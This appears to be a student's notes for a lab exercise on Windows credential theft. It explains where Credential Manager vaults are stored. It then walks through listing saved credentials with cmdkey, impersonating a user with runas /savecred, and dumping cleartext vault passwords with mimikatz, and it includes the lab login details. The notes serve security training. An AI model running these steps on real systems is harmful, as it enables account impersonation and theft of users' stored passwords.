
## Credential Manager

- It allows users to securely store credentials of other applications and websites the user uses or accesses.
- Credentials are stored in a special encrypted folder on the computer under the user and system profiles :
	- `%UserProfile%\AppData\Local\Microsoft\Vault\`
	- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
	- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
	- `%ProgramData%\Microsoft\Vault\`
	- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`
- Each vault folder contains a `Policy.vpl` file. 
	- This file contains AES keys that is protected by DPAPI (Windows mechanism to encrypt sensitive data).
	- These AES keys are used itself to encrypt credentials.
	- Newer version of Windows use `Credential Guard` to further encrypt DPAPI master keys by storing them in secured memory enclaves (**Virtualization-based Security**)

## Windows Vaults

- Windows vaults or Credential Lockers can be used to store the following stuff :-
	- Web Credentials
	- Windows Credentials


---
## Questions and Solutions


-  What is the password mcharles uses for OneDrive?
	- **Inlanefreight#2025**

RDP to **TARGET IP** (ACADEMY-PWATTCK-CREDDEV01), with user "sadams" and password "totally2brow2harmon@"


#### Enumerating User Credentials

```cmd
$ C:\Users\sadams>cmdkey /list
Currently stored credentials:
Target: Domain:interactive=SRV01\mcharles
Type: Domain Password
User: SRV01\mcharles  
```

#### Impersonating as the User

```bash
runas /savecred /user:<username found in cmdkey> cmd
```

After running the command use the `whoami` command to verify whether you are logged inside the command prompt as `srv01\mcharles` user or not.


Now we need to transfer the `mimikatz` tool to Windows. Before sending the folder zip the file using `zip -r` command. After transfer copy the file to `Adminstrator` folder and run the `mimikatz` command.

```cmd
C:\Users\Administrator>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # vault::cred
TargetName : onedrive.live.com / <NULL>
UserName   : mcharles@inlanefreight.local
Comment    : <NULL>
Type       : 1 - generic
Persist    : 3 - enterprise
Flags      : 00000000
Credential : Inlanefreight#2025
Attributes : 0

TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>
UserName   : 02jejfxhvabjneqt
Comment    : PersistedCredential
Type       : 1 - generic
Persist    : 2 - local_machine
Flags      : 00000000
Credential :
Attributes : 32

TargetName : LegacyGeneric:target=onedrive.live.com / <NULL>
UserName   : mcharles@inlanefreight.local
Comment    : <NULL>
Type       : 1 - generic
Persist    : 3 - enterprise
Flags      : 00000000
Credential : Inlanefreight#2025
Attributes : 0
```



